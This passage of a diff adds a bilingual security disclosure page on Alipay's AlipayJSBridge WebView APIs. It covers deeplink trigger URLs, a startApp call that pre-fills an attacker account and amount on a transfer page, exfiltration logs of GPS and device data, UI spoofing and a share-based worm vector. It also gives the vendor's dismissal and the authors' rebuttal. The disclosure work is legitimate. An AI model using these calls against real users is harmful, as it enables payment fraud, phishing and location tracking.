+      <span class="zh">在支付宝 WebView 中加载后，演示 AlipayJSBridge API 可以获取的所有数据。<strong>所有数据仅在本地显示，不发送到任何服务器。</strong></span>
+      <span class="en">When loaded inside Alipay WebView, demonstrates all data accessible via AlipayJSBridge APIs. <strong>All data is displayed locally only, not sent to any server.</strong></span>
+    </p>
+    <div class="evidence-box">
+      <div class="label">URL</div>
+      <a href="https://innora.ai/zfb/poc/verify.html" style="color: var(--blue); font-weight: 600;">https://innora.ai/zfb/poc/verify.html</a>
+    </div>
+    <div class="evidence-box">
+      <div class="label">
+        <span class="zh">触发方式</span><span class="en">Trigger Method</span>
+      </div>
+      <code style="font-size: 12px; color: var(--text2);">alipays://platformapi/startapp?appId=20000067&url=https://innora.ai/zfb/poc/verify.html</code>
+    </div>
+  </div>
+
+  <div class="card" style="border-left: 4px solid var(--green);">
+    <h3>
+      <span class="zh">Chain WebView — 链式加载演示</span>
+      <span class="en">Chain WebView — Chain Loading Demo</span>
+    </h3>
+    <p>
+      <span class="zh">证明通过 pushWindow 链式加载的页面同样获得完整 JSBridge 访问权限。</span>
+      <span class="en">Proves that pages chain-loaded via pushWindow also receive full JSBridge access.</span>
+    </p>
+    <div class="evidence-box">
+      <div class="label">URL</div>
+      <a href="https://innora.ai/zfb/poc/chain.html" style="color: var(--green); font-weight: 600;">https://innora.ai/zfb/poc/chain.html</a>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 4. VERIFIED ISSUES ==================== -->
+<section id="vulns">
+  <h2><span class="num">04</span>
+    <span class="zh">已验证安全问题</span>
+    <span class="en">Verified Security Issues</span>
+  </h2>
+
+  <div class="zh">
+    <p>以下所有问题均在真实设备上端到端验证，有服务器日志和截图为证。我们对每个发现都标注了验证状态和证据类型。</p>
+  </div>
+  <div class="en">
+    <p>All issues below were verified end-to-end on real devices, with server logs and screenshots as evidence. Each finding includes verification status and evidence type.</p>
+  </div>
+
+  <!-- V-01 -->
+  <div class="card card-critical">
+    <span class="severity sev-critical">CRITICAL</span>
+    <h3>V-01: <span class="zh">转账页面预填攻击者账号</span><span class="en">Transfer Page Pre-filled with Attacker Account</span></h3>
+    <p>
+      <span class="zh"><code>startApp</code> API 允许外部页面打开支付宝转账页面，并预填收款账号和转账金额。受害者看到的是一个已经填好攻击者账号的转账界面。最终转账仍需用户点击确认按钮，但配合 UI 欺骗（V-08）和社会工程，用户误操作的风险极高。</span>
+      <span class="en">The <code>startApp</code> API allows external pages to open Alipay's transfer page with pre-filled recipient account and amount. The victim sees a transfer form already populated with the attacker's account. Final transfer still requires user confirmation, but combined with UI spoofing (V-08) and social engineering, the risk of user error is extremely high.</span>
+    </p>
+    <div class="evidence-box">
+      <div class="label">
+        <span class="zh">服务器日志证据</span><span class="en">Server Log Evidence</span>
+      </div>
+<pre><code>{"tag":"f_startApp:转账预填(09999988)",
+ "data":{"status":"ok","result":{"success":true}}}</code></pre>
+    </div>
+    <p><strong>API:</strong> <code>AlipayJSBridge.call("startApp", {appId:"09999988", param:{actionType:"toAccount", account:"attacker@evil.com", amount:"1000"}})</code></p>
+  </div>
+
+  <!-- V-02 -->
+  <div class="card card-critical">
+    <span class="severity sev-critical">CRITICAL</span>
+    <h3>V-02: <span class="zh">pushWindow 执行转账 DeepLink</span><span class="en">pushWindow Executes Transfer DeepLink</span></h3>
+    <p>
+      <span class="zh"><code>pushWindow</code> API 允许外部页面通过 <code>alipays://</code> scheme 执行转账 DeepLink，传递攻击者账号和金额。</span>
+      <span class="en">The <code>pushWindow</code> API allows external pages to execute transfer DeepLinks via the <code>alipays://</code> scheme, passing attacker account and amount.</span>
+    </p>
+    <div class="evidence-box">
+      <div class="label">
+        <span class="zh">服务器日志证据</span><span class="en">Server Log Evidence</span>
+      </div>
+<pre><code>{"tag":"f_pushWindow:transfer_scheme",
+ "data":{"status":"ok","result":{"success":"true"}}}</code></pre>
+    </div>
+  </div>
+
+  <!-- V-03 -->
+  <div class="card card-critical">
+    <span class="severity sev-critical">CRITICAL</span>
+    <h3>V-03: <span class="zh">pushWindow 打开支付收银台</span><span class="en">pushWindow Opens Payment Cashier</span></h3>
+    <p>
+      <span class="zh">外部页面可以通过 <code>pushWindow</code> 打开支付宝的支付收银台 URL。</span>
+      <span class="en">External pages can open Alipay's payment cashier URL via <code>pushWindow</code>.</span>
+    </p>
+    <div class="evidence-box">
+      <div class="label">
+        <span class="zh">服务器日志证据</span><span class="en">Server Log Evidence</span>
+      </div>
+<pre><code>{"tag":"f_pushWindow:cashier(支付收银台)",
+ "data":{"status":"ok","result":{"success":"true"}}}</code></pre>
+    </div>
+  </div>
+
+  <!-- V-04 -->
+  <div class="card card-critical">
+    <span class="severity sev-critical">CRITICAL</span>
+    <h3>V-04: <span class="zh">tradePay 触发支付 SDK</span><span class="en">tradePay Triggers Payment SDK</span></h3>
+    <p>
+      <span class="zh"><code>tradePay</code> API 可以被外部页面调用，弹出支付宝支付界面。我们测试了3种参数格式，全部成功触发（resultCode=6001表示用户手动取消，但支付界面确实弹出了）。</span>
+      <span class="en">The <code>tradePay</code> API can be called from external pages, launching the Alipay payment UI. We tested 3 parameter formats, all successfully triggered (resultCode=6001 means user manually cancelled, but the payment UI did appear).</span>
+    </p>
+    <div class="evidence-box">
+      <div class="label">
+        <span class="zh">服务器日志证据</span><span class="en">Server Log Evidence</span>
+      </div>
+<pre><code>{"tag":"f_tradePay:full_orderStr",
+ "data":{"status":"ok","result":{"resultCode":"6001"}}}</code></pre>
+    </div>
+  </div>
+
+  <!-- V-05 -->
+  <div class="card card-critical">
+    <span class="severity sev-critical">CRITICAL</span>
+    <h3>V-05: <span class="zh">完整数据外传链路 (308条日志)</span><span class="en">Full Data Exfiltration Chain (308 Log Entries)</span></h3>
+    <p>
+      <span class="zh">外部页面中的 JavaScript 成功将 GPS 坐标、设备信息、网络信息、会话 ID 等数据通过 XHR POST + Image Beacon 双通道发送到攻击者服务器。总计 <strong>308 条</strong>完整日志记录。</span>
+      <span class="en">JavaScript in external pages successfully exfiltrated GPS coordinates, device info, network info, session IDs via dual-channel XHR POST + Image Beacon to attacker server. Total: <strong>308 complete log entries</strong>.</span>
+    </p>
+  </div>
+
+  <!-- V-06 to V-08 -->
+  <div class="card card-high">
+    <span class="severity sev-high">HIGH</span>
+    <h3>V-06: <span class="zh">18个敏感内部页面可被外部页面跳转</span><span class="en">18 Sensitive Internal Pages Navigable from External Page</span></h3>
+    <p>
+      <span class="zh">通过 <code>startApp</code> API，外部页面可以跳转到包括交易记录、银行卡管理、芝麻信用、提现、亲情号在内的 18 个敏感内部页面，全部返回 <code>success: true</code>。</span>
+      <span class="en">Via the <code>startApp</code> API, external pages can navigate to 18 sensitive internal pages including transaction history, bank card management, credit score, withdrawal, and family accounts. All returned <code>success: true</code>.</span>
+    </p>
+  </div>
+
+  <div class="card card-high">
+    <span class="severity sev-high">HIGH</span>
+    <h3>V-07: <span class="zh">GPS 精确定位窃取（无用户感知）</span><span class="en">GPS Location Theft (No User Awareness)</span></h3>
+    <p>
+      <span class="zh"><code>getLocation</code> API 在外部页面调用时，如果用户此前已授予支付宝位置权限，<strong>不显示任何二次确认弹窗</strong>，直接返回精确 GPS 坐标。已在 3 台设备上验证（新西兰 Android、马来西亚 Android、中国杭州 iOS）。注意 iOS 14+ 的模糊定位设置可能影响精度。</span>
+      <span class="en"><code>getLocation</code> API when called from external pages, if the user has previously granted location permission to Alipay, shows <strong>no secondary consent dialog</strong>, directly returning precise GPS coordinates. Verified on 3 devices (New Zealand Android, Malaysia Android, Hangzhou China iOS). Note: iOS 14+ approximate location settings may affect precision.</span>
+    </p>
+    <div class="evidence-box">
+      <div class="label">
+        <span class="zh">三台设备 GPS 数据</span><span class="en">GPS Data from 3 Devices</span>
+      </div>
+<pre><code>// Samsung S25 Ultra — Auckland, New Zealand
+{"lat": -36.707669, "lng": 174.719378, "city": "奥克兰", "country": "新西兰", "accuracy": 25}
+
+// Redmi 23129RN51X — Penang, Malaysia
+{"lat": 5.460012, "lng": 100.314139, "city": "槟城", "country": "马来西亚", "accuracy": 35}
+
+// iPhone 16 Pro — Hangzhou, China
+{"lat": 30.306882, "lng": 120.121303, "city": "杭州市"}</code></pre>
+    </div>
+  </div>
+
+  <div class="card card-high">
+    <span class="severity sev-high">HIGH</span>
+    <h3>V-08: <span class="zh">UI 欺骗: 虚假转账通知 + 标题篡改</span><span class="en">UI Spoofing: Fake Transfer Notifications + Title Bar Spoofing</span></h3>
+    <p>
+      <span class="zh">攻击者可在支付宝内显示任意 toast 消息（如 "转账 ¥5,000 到 张*明 成功"），并将标题栏修改为 "安全中心" / "红包领取" 等钓鱼标题。配合社会工程，受害者无法区分真假。</span>
+      <span class="en">Attacker can display arbitrary toast messages inside Alipay (e.g., "Transfer ¥5,000 to Zhang*Ming completed") and modify the title bar to "Security Center" / "Red Packet Claim." Combined with social engineering, victims cannot distinguish real from fake.</span>
+    </p>
+  </div>
+
+  <div class="card card-high">
+    <span class="severity sev-high">HIGH</span>
+    <h3>V-09: <span class="zh">OAuth 授权流程劫持</span><span class="en">OAuth Authorization Flow Hijacking</span></h3>
+    <p>
+      <span class="zh"><code>getAuthCode</code> API 可被外部页面触发，发起 OAuth 服务端调用。虽然未成功获取授权码，但弹出了"服务忙，请稍后再试"弹窗，证明请求到达了 OAuth 服务端。</span>
+      <span class="en">The <code>getAuthCode</code> API can be triggered by external pages, initiating OAuth server-side calls. While no auth code was obtained, a "Service busy, please try later" popup appeared, proving the request reached the OAuth server.</span>
+    </p>
+  </div>
+
+  <div class="card card-high">
+    <span class="severity sev-high">HIGH</span>
+    <h3>V-10: <span class="zh">零交互暴露余额宝余额和转账联系人</span><span class="en">Zero-Interaction Exposure of Yu'E Bao Balance and Transfer Contacts</span></h3>
+    <p>
+      <span class="zh">通过 DeepLink 直接打开余额宝页面，显示余额 ¥5.00 和累计收益 ¥9,453.67。转账联系人页面暴露 20+ 联系人完整真实姓名。无需任何额外确认。</span>
+      <span class="en">DeepLink directly opens Yu'E Bao page showing balance ¥5.00 and total earnings ¥9,453.67. Transfer contacts page exposes 20+ contacts' full real names. No additional confirmation required.</span>
+    </p>
+  </div>
+
+  <!-- Full vulnerability table -->
+  <h3>
+    <span class="zh">完整问题列表</span>
+    <span class="en">Complete Issue List</span>
+  </h3>
+
+  <table>
+    <tr>
+      <th>ID</th>
+      <th>
+        <span class="zh">问题</span><span class="en">Issue</span>
+      </th>
+      <th>
+        <span class="zh">严重度</span><span class="en">Severity</span>
+      </th>
+      <th>
+        <span class="zh">验证</span><span class="en">Verified</span>
+      </th>
+    </tr>
+    <tr><td>V-01</td><td><span class="zh">startApp 预填攻击者账号到转账页面</span><span class="en">startApp pre-fills attacker account on transfer page</span></td><td><span class="severity sev-critical">CRIT</span></td><td>308 logs</td></tr>
+    <tr><td>V-02</td><td><span class="zh">pushWindow 执行转账 DeepLink</span><span class="en">pushWindow executes transfer DeepLink</span></td><td><span class="severity sev-critical">CRIT</span></td><td>308 logs</td></tr>
+    <tr><td>V-03</td><td><span class="zh">pushWindow 打开支付收银台</span><span class="en">pushWindow opens payment cashier</span></td><td><span class="severity sev-critical">CRIT</span></td><td>308 logs</td></tr>
+    <tr><td>V-04</td><td><span class="zh">tradePay 触发支付 SDK</span><span class="en">tradePay triggers payment SDK</span></td><td><span class="severity sev-critical">CRIT</span></td><td>308 logs</td></tr>
+    <tr><td>V-05</td><td><span class="zh">完整数据外传链路</span><span class="en">Full data exfiltration chain</span></td><td><span class="severity sev-critical">CRIT</span></td><td>308 logs</td></tr>
+    <tr><td>V-06</td><td><span class="zh">18个敏感页面可跳转</span><span class="en">18 sensitive pages navigable</span></td><td><span class="severity sev-high">HIGH</span></td><td>42 screenshots</td></tr>
+    <tr><td>V-07</td><td><span class="zh">GPS 精确定位窃取</span><span class="en">GPS location theft</span></td><td><span class="severity sev-high">HIGH</span></td><td>3 devices</td></tr>
+    <tr><td>V-08</td><td><span class="zh">UI 欺骗 (toast + 标题篡改)</span><span class="en">UI spoofing (toast + title bar)</span></td><td><span class="severity sev-high">HIGH</span></td><td>308 logs</td></tr>
+    <tr><td>V-09</td><td><span class="zh">OAuth 授权流程劫持</span><span class="en">OAuth flow hijacking</span></td><td><span class="severity sev-high">HIGH</span></td><td>screenshot</td></tr>
+    <tr><td>V-10</td><td><span class="zh">余额宝余额 + 联系人姓名暴露</span><span class="en">Yu'E Bao balance + contact names exposed</span></td><td><span class="severity sev-high">HIGH</span></td><td>screenshot</td></tr>
+    <tr><td>V-11</td><td><span class="zh">收款二维码 + 真实姓名泄露</span><span class="en">Payment QR + real name exposure</span></td><td><span class="severity sev-high">HIGH</span></td><td>screenshot</td></tr>
+    <tr><td>V-12</td><td><span class="zh">pushWindow 跳转登录页面 (钓鱼入口)</span><span class="en">pushWindow redirects to login page (phishing)</span></td><td><span class="severity sev-high">HIGH</span></td><td>screenshot</td></tr>
+    <tr><td>V-13</td><td><span class="zh">链式 WebView 攻击</span><span class="en">Chain WebView attack</span></td><td><span class="severity sev-high">HIGH</span></td><td>308 logs</td></tr>
+    <tr><td>V-14</td><td><span class="zh">会话信息泄露</span><span class="en">Session info leakage</span></td><td><span class="severity sev-medium">MED</span></td><td>308 logs</td></tr>
+    <tr><td>V-15</td><td><span class="zh">完整设备指纹外传</span><span class="en">Full device fingerprint exfiltration</span></td><td><span class="severity sev-medium">MED</span></td><td>308 logs</td></tr>
+    <tr><td>V-16</td><td><span class="zh">网络信息泄露</span><span class="en">Network info leakage</span></td><td><span class="severity sev-medium">MED</span></td><td>308 logs</td></tr>
+    <tr><td>V-17</td><td><span class="zh">API 权限地图泄露</span><span class="en">API permission map leakage</span></td><td><span class="severity sev-medium">MED</span></td><td>308 logs</td></tr>
+  </table>
+</section>
+
+<!-- ==================== 5. EVIDENCE ==================== -->
+<section id="evidence">
+  <h2><span class="num">05</span>
+    <span class="zh">证据展示</span>
+    <span class="en">Evidence</span>
+  </h2>
+
+  <h3>
+    <span class="zh">服务器端数据外传日志</span>
+    <span class="en">Server-Side Exfiltration Logs</span>
+  </h3>
+
+  <div class="zh">
+    <p>以下是攻击者服务器实际接收到的数据。这些日志记录在 <code>innora.ai</code> 上的数据收集端点，证明数据确实从支付宝 WebView 中外传到了外部服务器。</p>
+  </div>
+  <div class="en">
+    <p>Below are actual data received by the attacker server. These logs were recorded at the data collection endpoint on <code>innora.ai</code>, proving data was indeed exfiltrated from Alipay WebView to an external server.</p>
+  </div>
+
+  <div class="evidence-box">
+    <div class="label">
+      <span class="zh">GPS 定位数据（马来西亚槟城）</span>
+      <span class="en">GPS Location Data (Penang, Malaysia)</span>
+    </div>
+<pre><code>{
+  "timestamp": "2026-03-07 11:53:51.599",
+  "method": "POST",
+  "path": "/exfil",
+  "body": {
+    "tag": "getLocation:GPS location",
+    "data": {
+      "status": "ok",
+      "data": {
+        "accuracy": 35,
+        "city": "槟城",
+        "country": "马来西亚",
+        "latitude": 5.460012,
+        "longitude": 100.314139
+      }
+    }
+  }
+}</code></pre>
+  </div>
+
+  <div class="evidence-box">
+    <div class="label">
+      <span class="zh">设备完整指纹（Redmi）</span>
+      <span class="en">Full Device Fingerprint (Redmi)</span>
+    </div>
+<pre><code>{
+  "tag": "getSystemInfo:Device info",
+  "data": {
+    "apiLevel": 36,
+    "app": "alipay",
+    "bluetoothEnabled": true,
+    "brand": "Redmi",
+    "cameraAuthorized": false,
+    "currentBattery": "100%",
+    "locationAuthorized": true,
+    "model": "Xiaomi 23129RN51X",
+    "platform": "Android",
+    "screenHeight": 1650,
+    "screenWidth": 720,
+    "storage": "119 GB",
+    "system": "16",
+    "version": "10.8.26.7000",
+    "wifiEnabled": true
+  }
+}</code></pre>
+  </div>
+
+  <div class="evidence-box">
+    <div class="label">
+      <span class="zh">会话参数泄露（含 sessionId 和来源信息）</span>
+      <span class="en">Session Parameter Leakage (incl. sessionId and source info)</span>
+    </div>
+<pre><code>{
+  "tag": "getStartupParams",
+  "data": {
+    "sessionId": "session_20000067_22751",
+    "startFromExternal": "true",
+    "sourcePackageName": "com.android.chrome",
+    "safePayEnabled": "true",
+    "appId": "20000067",
+    "url": "http://192.168.80.12:8888/chain1.html"
+  }
+}</code></pre>
+  </div>
+
+  <div class="evidence-box">
+    <div class="label">
+      <span class="zh">转账页面预填成功</span>
+      <span class="en">Transfer Page Pre-fill Success</span>
+    </div>
+<pre><code>{"tag": "f_startApp:转账预填(09999988)", "data": {"status": "ok", "result": {"success": true}}}
+{"tag": "f_pushWindow:transfer_scheme", "data": {"status": "ok", "result": {"success": "true"}}}
+{"tag": "f_pushWindow:cashier(支付收银台)", "data": {"status": "ok", "result": {"success": "true"}}}
+{"tag": "f_tradePay:full_orderStr", "data": {"status": "ok", "result": {"resultCode": "6001"}}}</code></pre>
+  </div>
+
+  <div class="evidence-box">
+    <div class="label">
+      <span class="zh">User-Agent 证明数据来自支付宝 WebView</span>
+      <span class="en">User-Agent Proves Data Originates from Alipay WebView</span>
+    </div>
+<pre><code>Mozilla/5.0 (Linux; Android 16; 23129RN51X Build/BP2A.250605.031.A3; wv)
+AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0
+Chrome/126.0.6478.122
+NebulaSDK/1.8.100112 Nebula
+AliApp(AP/10.8.26.7000) AlipayClient/10.8.26.7000
+Language/zh-Hant Region/CN</code></pre>
+    <p>
+      <span class="zh">User-Agent 中包含 <code>NebulaSDK</code>、<code>AliApp(AP/10.8.26.7000)</code>、<code>AlipayClient</code> — 这是支付宝 Nebula WebView 容器的独特标识，无法伪造。证明这些请求确实来自支付宝应用内部。</span>
+      <span class="en">The User-Agent contains <code>NebulaSDK</code>, <code>AliApp(AP/10.8.26.7000)</code>, <code>AlipayClient</code> — unique identifiers of the Alipay Nebula WebView container that cannot be forged. This proves these requests genuinely originated from within the Alipay app.</span>
+    </p>
+  </div>
+
+  <h3>
+    <span class="zh">证据文件清单</span>
+    <span class="en">Evidence File Inventory</span>
+  </h3>
+
+  <table>
+    <tr>
+      <th>
+        <span class="zh">文件类型</span><span class="en">File Type</span>
+      </th>
+      <th>
+        <span class="zh">数量</span><span class="en">Count</span>
+      </th>
+      <th>
+        <span class="zh">描述</span><span class="en">Description</span>
+      </th>
+    </tr>
+    <tr>
+      <td>
+        <span class="zh">设备截图</span><span class="en">Device Screenshots</span>
+      </td>
+      <td>42</td>
+      <td>
+        <span class="zh">包含 CRITICAL 标签的 25 张 + 普通验证 17 张</span>
+        <span class="en">25 with CRITICAL labels + 17 general verification</span>
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <span class="zh">服务器日志</span><span class="en">Server Logs</span>
+      </td>
+      <td>308 entries</td>
+      <td>
+        <span class="zh">exfil_server_log_20260307_complete.jsonl (136 KB)</span>
+        <span class="en">exfil_server_log_20260307_complete.jsonl (136 KB)</span>
+      </td>
+    </tr>
+    <tr>
+      <td><span class="zh">PoC HTML</span><span class="en">PoC HTML</span></td>
+      <td>8</td>
+      <td>
+        <span class="zh">chain1~chain8 攻击链 + trigger 触发页</span>
+        <span class="en">chain1~chain8 attack chains + trigger page</span>
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <span class="zh">攻击服务器</span><span class="en">Attack Server</span>
+      </td>
+      <td>1</td>
+      <td>
+        <span class="zh">Python server.py (数据收集 + 日志记录)</span>
+        <span class="en">Python server.py (data collection + logging)</span>
+      </td>
+    </tr>
+    <tr>
+      <td>Nginx</td>
+      <td>1</td>
+      <td>
+        <span class="zh">nginx_exfil_access.log (52 KB)</span>
+        <span class="en">nginx_exfil_access.log (52 KB)</span>
+      </td>
+    </tr>
+  </table>
+</section>
+
+<!-- ==================== 6. DEVICES ==================== -->
+<section id="devices">
+  <h2><span class="num">06</span>
+    <span class="zh">跨平台验证</span>
+    <span class="en">Cross-Platform Verification</span>
+  </h2>
+
+  <div class="zh">
+    <p>所有攻击链在以下 3 台真实设备上独立验证成功，覆盖 Android 和 iOS 平台：</p>
+  </div>
+  <div class="en">
+    <p>All attack chains were independently verified on 3 real devices across Android and iOS platforms:</p>
+  </div>
+
+  <div class="devices-grid">
+    <div class="device-card">
+      <div class="icon">📱</div>
+      <div class="name">Samsung Galaxy S25 Ultra</div>
+      <div class="detail">SM-S938B</div>
+      <div class="detail">Android 16 (API 36)</div>
+      <div class="detail">
+        <span class="zh">奥克兰, 新西兰</span>
+        <span class="en">Auckland, New Zealand</span>
+      </div>
+      <div class="detail">Alipay 10.8.26.7000</div>
+    </div>
+    <div class="device-card">
+      <div class="icon">📱</div>
+      <div class="name">Redmi 23129RN51X</div>
+      <div class="detail">Xiaomi</div>
+      <div class="detail">Android 16 (API 36)</div>
+      <div class="detail">
+        <span class="zh">槟城, 马来西亚</span>
+        <span class="en">Penang, Malaysia</span>
+      </div>
+      <div class="detail">Alipay 10.8.26.7000</div>
+    </div>
+    <div class="device-card">
+      <div class="icon">📱</div>
+      <div class="name">iPhone 16 Pro</div>
+      <div class="detail">iPhone (18,4)</div>
+      <div class="detail">iOS 26.3.1</div>
+      <div class="detail">
+        <span class="zh">杭州, 中国</span>
+        <span class="en">Hangzhou, China</span>
+      </div>
+      <div class="detail">Alipay 10.8.30.6000</div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 7. iOS ==================== -->
+<section id="ios">
+  <h2><span class="num">07</span>
+    <span class="zh">iOS 特有风险</span>
+    <span class="en">iOS-Specific Risks</span>
+  </h2>
+
+  <div class="zh">
+    <p>iPhone 设备上的 API 权限比 Android <strong>更宽松</strong>，攻击面更大：</p>
+  </div>
+  <div class="en">
+    <p>API permissions on iPhone are <strong>more permissive</strong> than Android, creating a larger attack surface:</p>
+  </div>
+
+  <table>
+    <tr>
+      <th>API</th>
+      <th>Android</th>
+      <th>iOS</th>
+      <th>
+        <span class="zh">风险</span><span class="en">Risk</span>
+      </th>
+    </tr>
+    <tr>
+      <td><code>tradePay</code></td>
+      <td style="color:#44cc88">
+        <span class="zh">不可用</span><span class="en">N/A</span>
+      </td>
+      <td style="color:#ff4444">
+        <span class="zh">可用</span><span class="en">Available</span>
+      </td>
+      <td>
+        <span class="zh">触发支付 SDK</span><span class="en">Triggers payment SDK</span>
+      </td>
+    </tr>
+    <tr>
+      <td><code>share</code></td>
+      <td style="color:#44cc88">
+        <span class="zh">不可用</span><span class="en">N/A</span>
+      </td>
+      <td style="color:#ff4444">
+        <span class="zh">可用</span><span class="en">Available</span>
+      </td>
+      <td>
+        <span class="zh"><strong>蠕虫传播向量</strong> — 自动分享恶意链接到微信/QQ</span>
+        <span class="en"><strong>Worm propagation vector</strong> — auto-share malicious links to WeChat/QQ</span>
+      </td>
+    </tr>
+    <tr>
+      <td><code>scan</code></td>
+      <td style="color:#44cc88">
+        <span class="zh">不可用</span><span class="en">N/A</span>
+      </td>
+      <td style="color:#ff4444">
+        <span class="zh">可用</span><span class="en">Available</span>
+      </td>
+      <td>
+        <span class="zh">打开摄像头</span><span class="en">Opens camera</span>
+      </td>
+    </tr>
+    <tr>
+      <td><code>chooseImage</code></td>
+      <td style="color:#44cc88">
+        <span class="zh">不可用</span><span class="en">N/A</span>
+      </td>
+      <td style="color:#ff4444">
+        <span class="zh">可用</span><span class="en">Available</span>
+      </td>
+      <td>
+        <span class="zh">访问相册</span><span class="en">Access photo library</span>
+      </td>
+    </tr>
+    <tr>
+      <td><code>getLocation</code></td>
+      <td style="color:#44cc88">
+        <span class="zh">checkJSAPI 不可用</span><span class="en">checkJSAPI N/A</span>
+      </td>
+      <td style="color:#ff4444">
+        <span class="zh">可用</span><span class="en">Available</span>
+      </td>
+      <td>
+        <span class="zh">定位窃取</span><span class="en">Location theft</span>
+      </td>
+    </tr>
+  </table>
+
+  <div class="callout">
+    <p>
+      <span class="zh"><strong>蠕虫风险</strong>：iOS 上的 <code>share</code> API 意味着攻击者页面可以自动将恶意链接分享到微信、QQ、短信、钉钉等平台，实现自我传播。一个受害者点击链接 → 恶意链接自动分享给其联系人 → 指数级传播。</span>
+      <span class="en"><strong>Worm Risk</strong>: The <code>share</code> API on iOS means the attacker page can automatically share the malicious link to WeChat, QQ, SMS, DingTalk, etc. One victim clicks → malicious link auto-shared to contacts → exponential propagation.</span>
+    </p>
+  </div>
+</section>
+
+<!-- ==================== 8. WORKING DEFENSES ==================== -->
+<section id="defense">
+  <h2><span class="num">08</span>
+    <span class="zh">已生效的防护</span>
+    <span class="en">Working Defenses</span>
+  </h2>
+
+  <div class="zh">
+    <p>客观地说，支付宝的安全架构确实有部分防护措施正在生效。以下 API 在外部域名下被正确拦截（返回 <code>permission denied</code>）：</p>
+  </div>
+  <div class="en">
+    <p>To be objective, Alipay's security architecture does have some working defensive measures. The following APIs are correctly blocked from external domains (returning <code>permission denied</code>):</p>
+  </div>
+
+  <ul>
+    <li><code>clipboard</code> <span class="zh">读写</span><span class="en">read/write</span></li>
+    <li><code>getUserInfo</code></li>
+    <li><code>rpc</code> (<span class="zh">后端 RPC 调用</span><span class="en">backend RPC calls</span>)</li>
+    <li><code>httpRequest</code> (bridge-level)</li>
+    <li><code>openInBrowser</code></li>
+    <li><code>sendSMS</code> (<span class="zh">实际发送被拦截</span><span class="en">actual sending blocked</span>)</li>
+    <li><code>makePhoneCall</code></li>
+  </ul>
+
+  <div class="zh">
+    <p>这说明支付宝<strong>有能力</strong>在 JSBridge 层面实施域名白名单和权限控制。上述 17 个问题中涉及的 API 只是<strong>还没有被加入到同样的权限控制机制中</strong>。</p>
+  </div>
+  <div class="en">
+    <p>This demonstrates that Alipay <strong>has the capability</strong> to implement domain whitelisting and permission controls at the JSBridge level. The APIs involved in the 17 issues above simply <strong>haven't been added to the same permission control mechanism yet</strong>.</p>
+  </div>
+</section>
+
+<!-- ==================== 9. VENDOR RESPONSE ==================== -->
+<section id="vendor">
+  <h2><span class="num">09</span>
+    <span class="zh">厂商回应与讨论</span>
+    <span class="en">Vendor Response & Discussion</span>
+  </h2>
+
+  <div class="callout vendor">
+    <p>
+      <span class="zh"><strong>蚂蚁集团的回应（2026-03-11）</strong>：所报告的内容是"支付宝的正常功能"，不认为是安全漏洞。</span>
+      <span class="en"><strong>Ant Group's Response (2026-03-11)</strong>: The reported issues are "normal functionality of Alipay," not considered security vulnerabilities.</span>
+    </p>
+  </div>
+
+  <div class="zh">
+    <h3>我们的回应</h3>
+    <p>我们充分尊重厂商的判断。但以下事实不会因为判定结论而改变：</p>
+    <ol>
+      <li><strong>数据确实外传了。</strong> 308条服务器日志不是模拟的，GPS坐标 5.460012, 100.314139 确实从支付宝 WebView 发送到了我们的服务器。这个事实不受"是否是漏洞"的判定影响。</li>
+      <li><strong>转账页面确实被外部触发了。</strong> <code>startApp</code> 返回 <code>success: true</code>，转账页面确实打开了，攻击者的账号确实被预填了。这个事实不受"是否是漏洞"的判定影响。</li>
+      <li><strong>用户没有被充分告知。</strong> "继续访问"警告中<strong>没有</strong>告诉用户"该网站将获得调用支付宝内部API的能力，包括读取您的GPS位置、打开转账页面等"。用户不知道点击"继续访问"意味着什么。</li>
+      <li><strong>防护机制的不一致性。</strong> 既然 <code>clipboard</code> 和 <code>getUserInfo</code> 被正确拦截了，那 <code>getLocation</code> 和 <code>startApp</code> 为什么不需要同样的保护？同一个安全框架对不同API的处理方式不一致，这至少说明有改进空间。</li>
+      <li><strong>测试账户被封锁。</strong> 如果这些都是"正常功能"，那为什么我们的测试账户在使用这些"正常功能"时触发了风控？这本身就说明系统认为这些行为是异常的。</li>
+      <li><strong>公开讨论的权利。</strong> 既然官方确认这些不是安全漏洞而是"正常功能"，那我们讨论支付宝"正常功能"的安全影响，应该没有任何问题。</li>
+    </ol>
+
+    <p>我们发表这篇技术分析，不是为了争论"是不是漏洞"。<strong>我们只是在公开描述一个事实：攻击者可以通过一个链接，在不需要用户理解其后果的情况下，从支付宝中获取GPS定位、打开转账页面、显示假通知。</strong>读者可以自行判断这是否是一个值得关注的安全问题。</p>
+
+    <div class="callout info" style="margin-top: 20px;">
+      <p><strong>重要澄清</strong>：本文所有描述的攻击链均<strong>无法</strong>实现"零交互自动转账/扣款"。转账操作最终仍需用户主动点击确认按钮。我们讨论的核心风险是：在UI欺骗 + 社会工程 + 预填信息的组合攻击下，用户做出错误操作的概率被大幅提高。我们严格区分"页面成功跳转"和"资金操作完成"，不做任何夸大。</p>
+    </div>
+  </div>
+
+  <div class="en">
+    <h3>Our Response</h3>
+    <p>We fully respect the vendor's judgment. However, the following facts do not change based on the classification decision:</p>
+    <ol>
+      <li><strong>Data was indeed exfiltrated.</strong> The 308 server log entries are not simulated. GPS coordinates 5.460012, 100.314139 were indeed transmitted from Alipay WebView to our server. This fact is independent of whether it's classified as a "vulnerability."</li>
+      <li><strong>The transfer page was indeed triggered externally.</strong> <code>startApp</code> returned <code>success: true</code>, the transfer page opened, and the attacker's account was pre-filled. This fact is independent of the classification.</li>
+      <li><strong>Users are not adequately informed.</strong> The "Continue to visit" warning does <strong>not</strong> tell users: "This website will gain the ability to call Alipay internal APIs, including reading your GPS location, opening transfer pages, etc." Users don't know what clicking "Continue" means.</li>
+      <li><strong>Defense mechanism inconsistency.</strong> If <code>clipboard</code> and <code>getUserInfo</code> are correctly blocked, why don't <code>getLocation</code> and <code>startApp</code> receive the same protection? The inconsistent treatment of different APIs within the same security framework at minimum indicates room for improvement.</li>
+      <li><strong>Test account was banned.</strong> If these are all "normal features," why did our test account trigger risk controls when using these "normal features"? This itself indicates the system considers these behaviors abnormal.</li>
+      <li><strong>Right to public discussion.</strong> Since the vendor officially confirmed these are not security vulnerabilities but "normal features," discussing the security implications of Alipay's "normal features" should be entirely appropriate.</li>
+    </ol>
+
